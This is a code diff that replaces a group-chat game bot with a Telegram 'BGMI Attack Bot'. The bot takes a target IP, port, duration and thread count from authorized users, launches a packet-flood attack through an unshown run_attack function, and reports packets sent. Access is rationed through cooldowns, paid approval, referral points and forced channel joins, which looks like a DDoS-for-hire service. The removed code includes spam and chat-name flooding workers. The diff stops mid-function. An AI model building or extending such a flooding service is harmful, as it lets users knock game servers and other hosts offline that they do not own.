-        send_fire(tid, "🛡️ Rob failed! Target has active protection shield.")
-        return
-
-    if t_acc["bal"] < 100:
-        send_fire(tid, "❌ Target is too poor to be robbed!")
-        return
-
-    success = random.choice([True, False])
-    if success:
-        stolen = int(t_acc["bal"] * random.uniform(0.1, 0.4)) # 10% to 40%
-        add_bal(reply_to_uid, -stolen)
-        add_bal(sender, stolen)
-        send_fire(tid, f"🥷 **SUCCESSFUL ROBBERY!** Stole **${stolen}** from `{reply_to_uid}`!")
+async def perform_attack(chat_id, uid, ip, port, duration, threads):
+    LAST_ATTACK_TIME[uid] = time.time()
+    STATS["total_attacks"] += 1
+    save_stats()
+    await typing(chat_id, 1.2)
+    anim = await send_msg(chat_id, f"🚀 {P('Launching Attack')}...")
+    await asyncio.sleep(0.5)
+    await edit_msg(anim, f"🚀⚡ {P('Sending Packets')}...")
+    await asyncio.sleep(0.5)
+    await edit_msg(anim, f"🚀⚡💥 {P('Attack Started')} 🎯 {ip}:{port}")
+    stopped, total = await run_attack(chat_id, ip, port, duration, threads, anim)
+    if stopped:
+        await send_msg(chat_id, "🛑 " + P("Attack Stopped By User!"))
     else:
-        fine = 150
-        add_bal(sender, -fine)
-        send_fire(tid, f"🚔 **ROBBERY FAILED!** Police caught you and fined you **${fine}**!")
+        await send_msg(chat_id, f"✅ {P('Attack Completed')} 🎊\n"
+                                f"🎯 {ip}:{port}\n⏱️ {duration}s\n"
+                                f"📦 {total:,} {P('packets sent')}")
 
-def cmd_protect(tid, sender):
-    acc = get_user_acc(sender)
-    if acc["bal"] < 300:
-        send_fire(tid, "❌ Protection Shield costs **$300**. You don't have enough balance!")
-        return
-    
-    add_bal(sender, -300)
-    acc["protected_until"] = time.time() + 3600 # 1 Hour
-    save_economy()
-    send_fire(tid, "🛡️ **SHIELD ACTIVATED!** You are immune to Kill & Rob for **1 Hour**.")
+# ============================================================
+#  🔘 MAIN MENU
+# ============================================================
+def main_menu_kb(uid):
+    rows = [
+        [InlineKeyboardButton(text="🚀 Attack", callback_data="attack")],
+        [InlineKeyboardButton(text="🛑 Stop Attack", callback_data="stop")],
+        [InlineKeyboardButton(text="👤 User Info", callback_data="userinfo"),
+         InlineKeyboardButton(text="🎁 Referral", callback_data="referral")],
+        [InlineKeyboardButton(text="📊 Bot Status", callback_data="status")],
+    ]
+    if is_admin(uid):
+        rows += [
+            [InlineKeyboardButton(text="📢 Broadcast", callback_data="broadcast")],
+            [InlineKeyboardButton(text="➕ Add User", callback_data="adduser"),
+             InlineKeyboardButton(text="➖ Remove User", callback_data="removeuser")],
+            [InlineKeyboardButton(text="🔄 Update User", callback_data="updateuser"),
+             InlineKeyboardButton(text="📋 List Users", callback_data="listuser")],
+            [InlineKeyboardButton(text="🔄 Restart Bot", callback_data="restart")],
+        ]
+    return InlineKeyboardMarkup(inline_keyboard=rows)
 
-def cmd_checkprotect(tid, sender):
-    acc = get_user_acc(sender)
-    now = time.time()
-    if acc["protected_until"] > now:
-        rem = int((acc["protected_until"] - now) / 60)
-        send_fire(tid, f"🛡️ Your Protection Shield is ACTIVE for another {rem} minutes.")
+async def show_menu(chat_id, uid, edit=False, msg=None):
+    txt = (f"🏠 {P('Main Menu')}\n\n"
+           f"🔥 {P('Welcome to BGMI Attack Bot')} 🚀\n"
+           f"👆 {P('Use the buttons below')}")
+    kb = main_menu_kb(uid)
+    if edit and msg:
+        await edit_msg(msg, txt)
+        try:
+            await msg.edit_reply_markup(reply_markup=kb)
+        except Exception:
+            pass
     else:
-        send_fire(tid, "❌ You currently have no active protection shield. Use `.protect` to buy one.")
+        await send_msg(chat_id, txt, reply_markup=kb)
 
-def cmd_revive(tid, sender, reply_to_uid):
-    if not reply_to_uid:
-        send_fire(tid, "❌ Reply to a dead user to revive them!")
+# ============================================================
+#  📥 COMMANDS
+# ============================================================
+@dp.message(CommandStart())
+async def cmd_start(message: Message):
+    global STATS
+    uid = message.from_user.id
+    payload = ""
+    parts = message.text.split()
+    if len(parts) > 1:
+        payload = parts[1]
+
+    if uid not in POINTS:   # new user
+        POINTS[uid] = BONUS_POINTS_NEW_USER
+        STATS["total_points"] += BONUS_POINTS_NEW_USER
+        if payload.startswith("ref_"):
+            try:
+                ref_id = int(payload[4:])
+            except ValueError:
+                ref_id = None
+            if ref_id and ref_id != uid and ref_id in POINTS:
+                REFERRED_BY[uid] = ref_id
+                POINTS[ref_id] = POINTS.get(ref_id, 0) + POINTS_PER_REF
+                STATS["total_points"] += POINTS_PER_REF
+                save_points(); save_stats()
+                try:
+                    await send_msg(ref_id, f"🎉 {P('New referral joined')}! "
+                                           f"+{POINTS_PER_REF} {P('points')} 🪙\n"
+                                           f"{P('Your points')}: {POINTS[ref_id]}")
+                except Exception:
+                    pass
+        save_points(); save_stats()
+
+    if not await is_force_sub_ok(uid):
+        await send_msg(message.chat.id,
+                       f"⚠️ {P('Join our channels to unlock the bot')}! 👇",
+                       reply_markup=join_kb())
         return
-    s_acc = get_user_acc(sender)
-    t_acc = get_user_acc(reply_to_uid)
-    now = time.time()
+    await show_menu(message.chat.id, uid)
 
-    if t_acc["dead_until"] <= now:
-        send_fire(tid, "✨ Target user is already alive!")
+@dp.message(Command("menu"))
+async def cmd_menu(message: Message):
+    ensure_registered(message.from_user.id)
+    await show_menu(message.chat.id, message.from_user.id)
+
+@dp.message(Command("bgmi"))
+async def cmd_bgmi(message: Message):
+    uid = message.from_user.id
+    if not await check_authorization(uid):
+        await send_msg(message.chat.id, P("⛔ Access Denied! You are not authorized. DM @xchumt."))
         return
-
-    if s_acc["bal"] < 200:
-        send_fire(tid, "❌ Revive costs **$200**. You don't have enough balance!")
+    if ATTACK["running"]:
+        await send_msg(message.chat.id, P("⚠️ An attack is already running! Press /stop first."))
         return
-
-    add_bal(sender, -200)
-    t_acc["dead_until"] = 0
-    save_economy()
-    send_fire(tid, f"✨ **REVIVED!** User `{reply_to_uid}` was brought back to life by `{sender}`!")
-
-def cmd_leaderboard(tid):
-    sorted_users = sorted(economy_data.items(), key=lambda x: x[1].get("bal", 0), reverse=True)[:5]
-    msg = "🏆 **ECONOMY LEADERBOARD (TOP 5)** 🏆\n\n"
-    for idx, (uid, data) in enumerate(sorted_users, 1):
-        msg += f"{idx}. ID `{uid}` — **${data.get('bal', 0)}**\n"
-    send_fire(tid, msg)
-
-def cmd_social(tid, sender, reply_to_uid, action):
-    if not reply_to_uid:
-        send_fire(tid, f"❌ Reply to a user to {action} them!")
+    args = message.text.split()[1:]
+    if len(args) != 4:
+        await send_msg(message.chat.id,
+                       P("🤦 Usage: /bgmi <ip> <port> <time_sec> <threads>") + "\n\n" +
+                       P("Example: /bgmi 20.235.94.237 17870 180 180"))
         return
-    emojis = {"slap": "👋💥", "kiss": "💋✨", "hug": "🤗❤️"}
-    send_fire(tid, f"{emojis.get(action, '')} User `{sender}` gave a **{action.upper()}** to `{reply_to_uid}`!")
-
-# ================= 10 GAMBLING & BET GAMES =================
-def cmd_bet_game(tid, sender, game_type, args):
-    if not args:
-        send_fire(tid, f"❌ Usage: .{game_type} <amount> <choice>")
-        return
-    
-    parts = args.split()
     try:
-        bet = int(parts[0])
+        ip, port, duration, threads = args[0], int(args[1]), int(args[2]), int(args[3])
     except ValueError:
-        send_fire(tid, "❌ Invalid bet amount!")
+        await send_msg(message.chat.id, P("❌ Port/time/threads must be numbers!"))
         return
-
-    acc = get_user_acc(sender)
-    if bet <= 0 or acc["bal"] < bet:
-        send_fire(tid, "❌ Invalid bet amount or insufficient balance!")
+    if not (1 <= port <= 65535) or not (5 <= duration <= MAX_DURATION) or not (1 <= threads <= MAX_THREADS):
+        await send_msg(message.chat.id, P(f"❌ Limits: port 1-65535 | time 5-{MAX_DURATION} | threads 1-{MAX_THREADS}"))
         return
-
-    # 1. FLIP (Coin Toss)
-    if game_type == "flip":
-        choice = parts[1].lower() if len(parts) > 1 else "heads"
-        result = random.choice(["heads", "tails"])
-        if choice in result:
-            add_bal(sender, bet)
-            send_fire(tid, f"🪙 Coin landed on **{result.upper()}**! You WON **${bet}**! 🎉")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🪙 Coin landed on **{result.upper()}**! You Lost **${bet}**! 💸")
-
-    # 2. ROLLBET (Dice Guess)
-    elif game_type == "rollbet":
-        try:
-            guess = int(parts[1])
-        except (IndexError, ValueError):
-            send_fire(tid, "❌ Specify dice prediction (1-6)!")
-            return
-        roll = random.randint(1, 6)
-        if guess == roll:
-            win = bet * 5
-            add_bal(sender, win)
-            send_fire(tid, f"🎲 Rolled **{roll}**! PERFECT GUESS! Won **${win}**! 🚀")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🎲 Rolled **{roll}**! Better luck next time! Lost **${bet}**.")
-
-    # 3. SLOTS
-    elif game_type == "slots":
-        icons = ["🍎", "🍋", "🍒", "💎", "7️⃣"]
-        r = [random.choice(icons) for _ in range(3)]
-        slot_str = " | ".join(r)
-        if r[0] == r[1] == r[2]:
-            win = bet * 4
-            add_bal(sender, win)
-            send_fire(tid, f"🎰 [{slot_str}] 🎰\nJACKPOT! You WON **${win}**! 🔥")
-        elif r[0] == r[1] or r[1] == r[2] or r[0] == r[2]:
-            win = bet
-            add_bal(sender, win)
-            send_fire(tid, f"🎰 [{slot_str}] 🎰\nMATCHED TWO! You WON **${win}**! ✨")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🎰 [{slot_str}] 🎰\nNo match! You Lost **${bet}**.")
-
-    # 4. ROULETTE
-    elif game_type == "roulette":
-        choice = parts[1].lower() if len(parts) > 1 else "red"
-        num = random.randint(0, 36)
-        color = "red" if num % 2 == 0 else "black"
-        if choice == color:
-            add_bal(sender, bet)
-            send_fire(tid, f"🎡 Ball landed on **{num} ({color.upper()})**! You WON **${bet}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🎡 Ball landed on **{num} ({color.upper()})**! You Lost **${bet}**.")
-
-    # 5. RPS (Rock Paper Scissors)
-    elif game_type == "rps":
-        user_choice = parts[1].lower() if len(parts) > 1 else "rock"
-        bot_choice = random.choice(["rock", "paper", "scissors"])
-        if user_choice == bot_choice:
-            send_fire(tid, f"✂️ Both chose **{bot_choice.upper()}**! It's a TIE!")
-        elif (user_choice == "rock" and bot_choice == "scissors") or \
-             (user_choice == "paper" and bot_choice == "rock") or \
-             (user_choice == "scissors" and bot_choice == "paper"):
-            add_bal(sender, bet)
-            send_fire(tid, f"✂️ Bot chose **{bot_choice.upper()}**! You WON **${bet}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"✂️ Bot chose **{bot_choice.upper()}**! You Lost **${bet}**.")
-
-    # 6. GUESS (1 to 10)
-    elif game_type == "guess":
-        try:
-            num = int(parts[1])
-        except (IndexError, ValueError):
-            send_fire(tid, "❌ Guess a number from 1-10!")
-            return
-        secret = random.randint(1, 10)
-        if num == secret:
-            win = bet * 3
-            add_bal(sender, win)
-            send_fire(tid, f"🔮 Secret number was **{secret}**! You WON **${win}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🔮 Secret number was **{secret}**! You Lost **${bet}**.")
-
-    # 7. HIGHLOW
-    elif game_type == "highlow":
-        predict = parts[1].lower() if len(parts) > 1 else "high"
-        num = random.randint(1, 6)
-        res = "high" if num > 3 else "low"
-        if predict == res:
-            add_bal(sender, bet)
-            send_fire(tid, f"🎲 Rolled **{num} ({res.upper()})**! Correct! Won **${bet}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"🎲 Rolled **{num} ({res.upper()})**! Wrong! Lost **${bet}**.")
-
-    # 8. CRASH
-    elif game_type == "crash":
-        multi = round(random.uniform(1.0, 3.5), 2)
-        if multi >= 2.0:
-            win = int(bet * multi)
-            add_bal(sender, win)
-            send_fire(tid, f"🚀 Multiplier reached **{multi}x**! Cashed out **${win}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"💥 Crashed at **{multi}x**! You Lost **${bet}**.")
-
-    # 9. JACKPOT
-    elif game_type == "jackpot":
-        if random.randint(1, 10) == 7: # 10% chance
-            win = bet * 10
-            add_bal(sender, win)
-            send_fire(tid, f"💎 **MEGA JACKPOT!** You won **10x** earnings: **${win}**!")
-        else:
-            add_bal(sender, -bet)
-            send_fire(tid, f"❌ Missed the Jackpot! Lost **${bet}**.")
-
-    # 10. WHEEL
-    elif game_type == "wheel":
-        outcomes = [0, 0.5, 1.5, 3]
-        mult = random.choice(outcomes)
-        res_amt = int(bet * mult) - bet
-        add_bal(sender, res_amt)
-        if mult >= 1.0:
-            send_fire(tid, f"🎡 Wheel stopped at **{mult}x**! Won **${int(bet*mult)}**!")
-        else:
-            send_fire(tid, f"🎡 Wheel stopped at **{mult}x**! Lost balance!")
-
-def cmd_ping(tid):
-    t0 = time.time()
-    send_fire(tid, f"🏓 PONG!\nLatency: {int((time.time() - t0) * 1000)}ms\nStatus: Active ⚡")
-
-def cmd_alive(tid):
-    up = int(time.time() - START_TIME)
-    send_fire(tid, f"🔥 ALEXA BOT ONLINE 🔥\nUptime: {up//60}m {up%60}s\nOwner: @{OWNER}\nMade By: @IG1VX")
-
-def cmd_help(tid):
-    msg = (
-        "👑 **ALEXA BOT COMMANDS** 👑\n\n"
-        "🎮 **PUBLIC & UTILS:**\n"
-        ".roll | .flip | .ping | .alive | .adminlist\n\n"
-        "💰 **ECONOMY & BATTLE (REPLY BASED):**\n"
-        ".bal | .claim | .kill | .rob | .protect | .checkprotect | .revive | .leaderboard\n\n"
-        "🎭 **SOCIAL ACTIONS (REPLY):**\n"
-        ".slap | .kiss | .hug\n\n"
-        "🎰 **CASINO & BET GAMES:**\n"
-        ".flip <amt> <h/t> | .rollbet <amt> <1-6> | .slots <amt>\n"
-        ".roulette <amt> <r/b> | .rps <amt> <choice> | .guess <amt> <1-10>\n"
-        ".highlow <amt> <h/l> | .crash <amt> | .jackpot <amt> | .wheel <amt>\n\n"
-        "⚙️ **ADMIN & OWNER:**\n"
-        ".slide @user | .stopslide @user | .broadcast <msg>\n"
-        ".addadmin @user | .rmvadmin @user | .spam <txt> | .gc <name>"
-    )
-    send_fire(tid, msg)
-
-# ================= MAIN DISPATCHER =================
-def handle(tid, text, sender, reply_to_uid=None):
-    parts = text.split(" ", 1)
-    cmd = parts[0].lower()
-    arg = parts[1] if len(parts) > 1 else ""
-
-    admin_cmds = {
-        ".gc", ".stopgc", ".spam", ".stopspam", ".slide", ".stopslide",
-        ".addadmin", ".rmvadmin", ".broadcast"
-    }
-
-    # ADMIN COMMANDS CHECK
-    if cmd in admin_cmds:
-        if sender not in ADMINS:
-            send_fire(tid, "🚫 Permission Denied! Only Bot Admins/Owner can execute this.")
-            return
-
-        if cmd == ".addadmin":     cmd_addadmin(tid, arg, sender)
-        elif cmd == ".rmvadmin":   cmd_rmvadmin(tid, arg, sender)
-        elif cmd == ".slide":      cmd_slide(tid, arg)
-        elif cmd == ".stopslide":  cmd_stopslide(tid, arg)
-        elif cmd == ".broadcast":  cmd_broadcast(tid, arg, sender)
-        elif cmd == ".gc":
-            if not arg: send_fire(tid, "❌ Use: .gc <name>"); return
-            gc_flag[tid] = arg
-            threading.Thread(target=gc_worker, args=(tid, arg), daemon=True).start()
-            send_fire(tid, f"🔥 GC Name Changer Active: {arg}")
-        elif cmd == ".stopgc":
-            send_fire(tid, "⏹️ GC Changer Stopped!") if gc_flag.pop(tid, None) else send_fire(tid, "No active GC changer.")
-        elif cmd == ".spam":
-            if not arg: send_fire(tid, "❌ Use: .spam <text>"); return
-            if spam_flag.get(tid): send_fire(tid, "📢 Spam is already running!"); return
-            spam_flag[tid] = True
-            threading.Thread(target=spam_worker, args=(tid, arg), daemon=True).start()
-            send_fire(tid, f"📢 Spam Started: {arg}")
-        elif cmd == ".stopspam":
-            send_fire(tid, "⏹️ Spam Stopped!") if spam_flag.pop(tid, None) else send_fire(tid, "No active spam.")
+    now = time.time()
+    if uid in LAST_ATTACK_TIME and now - LAST_ATTACK_TIME[uid] < COOLDOWN:
+        wait = COOLDOWN - int(now - LAST_ATTACK_TIME[uid])
+        await send_msg(message.chat.id, P(f"⏳ Wait {wait} seconds before another attack!"))
         return
+    await perform_attack(message.chat.id, uid, ip, port, duration, threads)
 
-    # ECONOMY & GAMES
-    if cmd in [".bal", ".wallet"]:        cmd_bal(tid, sender, reply_to_uid)
-    elif cmd in [".claim", ".daily"]:     cmd_claim(tid, sender)
-    elif cmd == ".kill":                  cmd_kill(tid, sender, reply_to_uid)
-    elif cmd in [".rob", ".steal"]:       cmd_rob(tid, sender, reply_to_uid)
-    elif cmd == ".protect":               cmd_protect(tid, sender)
-    elif cmd == ".checkprotect":          cmd_checkprotect(tid, sender)
-    elif cmd == ".revive":                cmd_revive(tid, sender, reply_to_uid)
-    elif cmd in [".leaderboard", ".top"]: cmd_leaderboard(tid)
-    
-    # SOCIAL ACTIONS
-    elif cmd in [".slap", ".kiss", ".hug"]:
-        cmd_social(tid, sender, reply_to_uid, cmd.lstrip("."))
+@dp.message(Command("stop"))
+async def cmd_stop(message: Message):
+    if ATTACK["running"] and ATTACK["stop_event"]:
+        ATTACK["stop_event"].set()
+        if ATTACK["anim_msg"]:
+            await edit_msg(ATTACK["anim_msg"], "🛑 " + P("Stopping Attack") + "...")
+        await send_msg(message.chat.id, "🛑 " + P("Attack Stopped!"))
+    else:
+        await send_msg(message.chat.id, P("⚠️ No attack is currently running."))
 
-    # BET GAMES
-    elif cmd in [".flip", ".rollbet", ".slots", ".roulette", ".rps", ".guess", ".highlow", ".crash", ".jackpot", ".wheel"]:
-        cmd_bet_game(tid, sender, cmd.lstrip("."), arg)
+@dp.message(Command("status"))
+async def cmd_status(message: Message):
+    await show_status(message.chat.id)
 
-    # PUBLIC COMMANDS
-    elif cmd == ".roll":        cmd_roll(tid)
-    elif cmd == ".ping":        cmd_ping(tid)
-    elif cmd == ".alive":       cmd_alive(tid)
-    elif cmd == ".adminlist":   cmd_adminlist(tid)
-    elif cmd in [".help", ".start"]:
-        send_fire(tid, "✨ THIS BOT IS MADE BY @IG1VX ✨")
-        cmd_help(tid)
+@dp.message(Command("referral"))
+async def cmd_referral(message: Message):
+    ensure_registered(message.from_user.id)
+    await show_referral(message.chat.id, message.from_user.id)
 
-# ================= BACKGROUND MESSAGE MONITOR =================
-def process_auto_triggers(th, msg):
-    sid = str(msg.user_id)
-    txt = (msg.text or "").strip().lower()
+@dp.message(Command("redeem"))
+async def cmd_redeem(message: Message):
+    await do_redeem(message.chat.id, message.from_user.id)
 
-    # 1. AUTO SLIDE TRIGGER
-    if sid in slide_targets and not txt.startswith("."):
-        reply_msg = random.choice(SLIDE_RESPONSES)
-        send_fire(th.id, reply_msg)
+@dp.message(Command("userinfo"))
+async def cmd_userinfo(message: Message):
+    await show_userinfo(message.chat.id, message.from_user.id)
+
+# ============================================================
+#  🎁 REFERRAL
+# ============================================================
+async def show_referral(chat_id, uid):
+    pts = POINTS.get(uid, 0)
+    refs = sum(1 for r in REFERRED_BY.values() if r == uid)
+    link = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
+    txt = (f"🎁 {P('Referral Program')}\n\n"
+           f"🪙 {P('Your Points')}: {pts}\n"
+           f"👥 {P('Referrals')}: {refs}\n\n"
+           f"💸 +{POINTS_PER_REF} {P('points per referral')}\n"
+           f"⏰ {POINTS_FOR_HOUR} {P('points')} = {REDEEM_HOURS} {P('hour of access')}\n\n"
+           f"🔗 {P('Your Link')}:\n{link}\n\n"
+           f"{P('Share the link - jab koi join karega, points milenge')}!")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=f"🪙 Redeem {POINTS_FOR_HOUR} → {REDEEM_HOURS}hr", callback_data="redeem")],
+        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")],
+    ])
+    await send_msg(chat_id, txt, reply_markup=kb)
+
+async def do_redeem(chat_id, uid):
+    pts = POINTS.get(uid, 0)
+    if pts < POINTS_FOR_HOUR:
+        await send_msg(chat_id, P(f"❌ You need {POINTS_FOR_HOUR} points! You have {pts}."))
         return
+    POINTS[uid] -= POINTS_FOR_HOUR
+    now = datetime.datetime.now()
+    if uid in AUTHORIZED_USERS and AUTHORIZED_USERS[uid]["authorized_until"] > now:
+        AUTHORIZED_USERS[uid]["authorized_until"] += datetime.timedelta(hours=REDEEM_HOURS)
+    else:
+        AUTHORIZED_USERS[uid] = {"authorized_until": now + datetime.timedelta(hours=REDEEM_HOURS)}
+    save_points(); save_authorized_users()
+    exp = AUTHORIZED_USERS[uid]["authorized_until"].strftime("%Y-%m-%d %H:%M:%S")
+    await send_msg(chat_id, f"🎉 {P('Redeemed Successfully')}!\n"
+                            f"🪙 {P('Points left')}: {POINTS[uid]}\n"
+                            f"⏳ {P('Access until')}: {exp}")
 
-    # 2. OWNER DETECTION
-    if any(q in txt for q in ["owner kon hai", "who is owner", "owner name", "owner कौन है"]):
-        send_fire(th.id, "👑 My Owner is Alexa (@ig1vx) 🔥")
-        return
+# ============================================================
+#  📊 STATUS / USER INFO
+# ============================================================
+async def show_status(chat_id):
+    uptime = time.time() - START_TIME
+    running = ATTACK["running"]
+    info = ATTACK["info"] or {}
+    txt = (f"🤖 {P('Bot Status')}\n\n"
+           f"🟢 {P('Status')}: {P('Online')}\n"
+           f"⏱ {P('Uptime')}: {fmt_uptime(uptime)}\n"
+           f"⚔️ {P('Total Attacks')}: {STATS['total_attacks']}\n"
+           f"📦 {P('Packets Sent')}: {STATS['packets']:,}\n"
+           f"🎯 {P('Attack Running')}: {'🔥 Yes' if running else '❌ No'}\n"
+           f"🎯 {P('Target')}: {info.get('ip', '-')}:{info.get('port', '-')}\n"
+           f"👥 {P('Authorized Users')}: {len(AUTHORIZED_USERS)}\n"
+           f"🪙 {P('Total Points Awarded')}: {STATS['total_points']}\n"
+           f"⏳ {P('Cooldown')}: {COOLDOWN}s | 🧵 {P('Max Threads')}: {MAX_THREADS}")
+    if HAS_PSUTIL:
+        txt += f"\n💻 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%"
+    txt += "\n\n🔒 " + P("Force Sub") + ": ✅ " + P("Active")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
+    await send_msg(chat_id, txt, reply_markup=kb)
 
-    # 3. AI MENTION / CHAT
-    if "alexa" in txt or f"@{USERNAME.lower()}" in txt:
-        if not txt.startswith("."):
-            send_fire(th.id, random.choice(AI_RESPONSES))
-            return
+async def show_userinfo(chat_id, uid):
+    ud = AUTHORIZED_USERS.get(uid)
+    if ud and ud["authorized_until"] > datetime.datetime.now():
+        expiry = ud["authorized_until"].strftime("%Y-%m-%d %H:%M:%S")
+    else:
+        expiry = P("Oops Not Approved! Contact @xchumt")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
+    await send_msg(chat_id,
+                   f"🔖 {P('Role')}: {P('User')}\n"
+                   f"🆔 {P('User ID')}: {uid}\n"
+                   f"👤 {P('Username')}: @{uid}\n"
+                   f"🪙 {P('Points')}: {POINTS.get(uid, 0)}\n"
+                   f"⏳ {P('Approval / Expiry')}: {expiry}",
+                   reply_markup=kb)
 
-    # 4. SYSTEM EVENT: NEW MEMBER WELCOME
-    if msg.item_type == "action_log":
-        send_fire(th.id, "🎉 **WELCOME TO THE GROUP!** 🔥\nRule follow karna aur maza karna ✨")
+# ============================================================
+#  🔘 CALLBACKS (BUTTONS)
+# ============================================================
+@dp.callback_query(F.data == "menu")
+async def cb_menu(cq: CallbackQuery):
+    ensure_registered(cq.from_user.id)
+    await show_menu(cq.message.chat.id, cq.from_user.id, edit=True, msg=cq.message)
+    await cq.answer()
 
-# ================= MAIN LOOP =================
-print("⚙️ Catching up with existing messages...")
-try:
-    threads = cl.direct_threads(amount=3)
-    for th in threads:
-        for msg in th.messages:
-            processed.add(str(msg.id))
-    print("✅ Initialization done! Listening for commands & events...")
-except Exception as e:
-    print("⚠️ Init Warning:", e)
+@dp.callback_query(F.data == "check_sub")
+async def cb_check_sub(cq: CallbackQuery):
+    if await is_force_sub_ok(cq.from_user.id):
+        ensure_registered(cq.from_user.id)
+        await cq.answer("✅ Access granted!")
+        await show_menu(cq.message.chat.id, cq.from_user.id, edit=True, msg=cq.message)
+    else:
+        await cq.answer("❌ You are still not a member!", show_alert=True)
 
-while True:
+@dp.callback_query(F.data == "cancel")
+async def cb_cancel(cq: CallbackQuery, state: FSMContext):
+    await state.clear()
+    await cq.answer("❌ Cancelled!")
     try:
-        threads = cl.direct_threads(amount=3)
-        for th in threads:
-            for msg in th.messages:
-                msg_id = str(msg.id)
-                if msg_id in processed:
-                    continue
-                processed.add(msg_id)
+        await cq.message.delete()
+    except Exception:
+        pass
 
-                sid = str(msg.user_id)
-                if sid == BOT_ID:
-                    continue
+@dp.callback_query(F.data == "attack")
+async def cb_attack(cq: CallbackQuery, state: FSMContext):
+    uid = cq.from_user.id
+    if not await check_authorization(uid):
+        await cq.answer(P("⛔ Not authorized! DM @xchumt"), show_alert=True)
+        return
+    if ATTACK["running"]:
+        await cq.answer(P("⚠️ Attack already running! Use Stop first."), show_alert=True)
+        return
+    now = time.time()
+    if uid in LAST_ATTACK_TIME and now - LAST_ATTACK_TIME[uid] < COOLDOWN:
+        wait = COOLDOWN - int(now - LAST_ATTACK_TIME[uid])
+        await cq.answer(P(f"⏳ Wait {wait}s before another attack!"), show_alert=True)
+        return
+    await state.set_state(AttackState.waiting_args)
+    await cq.answer()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
+    await send_msg(cq.message.chat.id,
+                   f"🎯 {P('Send attack details')}:\n\n"
+                   f"<ip> <port> <time_sec> <threads>\n\n"
+                   f"{P('Example')}: 20.235.94.237 17870 180 180",
+                   reply_markup=kb)
 
-                # Reply Detection for .kill, .rob, .slap, etc.
-                reply_to_uid = None
-                if msg.reply_to_message:
-                    reply_to_uid = str(msg.reply_to_message.user_id)
+@dp.message(AttackState.waiting_args, F.text)
+async def handle_attack_args(message: Message, state: FSMContext):
+    await state.clear()
+    uid = message.from_user.id
+    if not await check_authorization(uid):
+        await send_msg(message.chat.id, P("⛔ Not authorized!"))
+        return
+    if ATTACK["running"]:
+        await send_msg(message.chat.id, P("⚠️ Attack already running!"))
+        return
+    args = message.text.split()
+    if len(args) != 4:
+        await send_msg(message.chat.id, P("❌ Invalid format! Send: <ip> <port> <time> <threads>"))
+        return
+    try:
+        ip, port, duration, threads = args[0], int(args[1]), int(args[2]), int(args[3])
+    except ValueError:
+        await send_msg(message.chat.id, P("❌ Port/time/threads must be numbers!"))
+        return
+    if not (1 <= port <= 65535) or not (5 <= duration <= MAX_DURATION) or not (1 <= threads <= MAX_THREADS):
+        await send_msg(message.chat.id, P(f"❌ Limits: port 1-65535 | time 5-{MAX_DURATION} | threads 1-{MAX_THREADS}"))
+        return
+    await perform_attack(message.chat.id, uid, ip, port, duration, threads)
 
-                txt = (msg.text or "").strip()
-                if txt.startswith("."):
-                    print(f"📩 Command Received: {txt}")
-                    threading.Thread(target=handle, args=(th.id, txt, sid, reply_to_uid), daemon=True).start()
-                else:
-                    threading.Thread(target=process_auto_triggers, args=(th, msg), daemon=True).start()
+@dp.callback_query(F.data == "stop")
+async def cb_stop(cq: CallbackQuery):
+    if ATTACK["running"] and ATTACK["stop_event"]:
+        ATTACK["stop_event"].set()
+        if ATTACK["anim_msg"]:
+            await edit_msg(ATTACK["anim_msg"], "🛑 " + P("Stopping..."))
+        await cq.answer("🛑 Attack Stopped!", show_alert=True)
+    else:
+        await cq.answer(P("⚠️ No attack running!"), show_alert=True)
 
-    except Exception as e:
-        print("[Main Loop Error]:", e)
+@dp.callback_query(F.data == "userinfo")
+async def cb_userinfo(cq: CallbackQuery):
+    ensure_registered(cq.from_user.id)
+    await cq.answer()
+    await show_userinfo(cq.message.chat.id, cq.from_user.id)
 
-    time.sleep(3)
+@dp.callback_query(F.data == "referral")
+async def cb_referral(cq: CallbackQuery):
+    ensure_registered(cq.from_user.id)
+    await cq.answer()
+    await show_referral(cq.message.chat.id, cq.from_user.id)
+
+@dp.callback_query(F.data == "redeem")
+async def cb_redeem(cq: CallbackQuery):
+    ensure_registered(cq.from_user.id)
+    await cq.answer()
+    await do_redeem(cq.message.chat.id, cq.from_user.id)
+
+@dp.callback_query(F.data == "status")
+async def cb_status(cq: CallbackQuery):
+    await cq.answer()
+    await show_status(cq.message.chat.id)
+
+# ---------- ADMIN CALLBACKS ----------
+@dp.callback_query(F.data == "broadcast")
+async def cb_broadcast(cq: CallbackQuery, state: FSMContext):
+    if not is_admin(cq.from_user.id):
+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await state.set_state(BroadcastState.waiting_text)
+    await cq.answer()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
+    await send_msg(cq.message.chat.id, f"📢 {P('Send the broadcast message')}:", reply_markup=kb)
+
+@dp.message(BroadcastState.waiting_text, F.text)
+async def handle_broadcast_text(message: Message, state: FSMContext):
+    await state.clear()
+    if not is_admin(message.from_user.id):
+        return
+    sent = failed = 0
+    for uid in list(POINTS.keys()):
+        try:
+            await send_msg(uid, message.text)
+            sent += 1
+        except Exception:
+            failed += 1
+    await send_msg(message.chat.id, f"✅ {P('Broadcast sent')}: {sent} ✅ | {failed} ❌")
+
+@dp.callback_query(F.data == "adduser")
+async def cb_adduser(cq: CallbackQuery, state: FSMContext):
+    if not is_admin(cq.from_user.id):
